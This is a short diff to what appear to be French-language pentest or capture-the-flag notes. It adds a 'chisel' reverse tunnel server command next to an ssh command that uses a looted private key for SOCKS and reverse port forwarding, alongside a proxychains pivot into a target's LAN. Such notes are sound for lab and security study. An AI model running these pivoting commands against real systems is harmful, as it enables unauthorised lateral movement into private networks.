@@ -60,5 +60,7 @@ proxychains ssh user@<IP_HOTE_ACCESSIBLE_DANS_LE_LAN_DE_NOTRE_CIBLE>
 ```
 
 ```
+chisel server -p 443 --reverse
+
 ssh webadmin@$TARGET_IP -i loot/id_rsa1 -D 1080  -R 1234:0.0.0.0:443 -v   
 ```
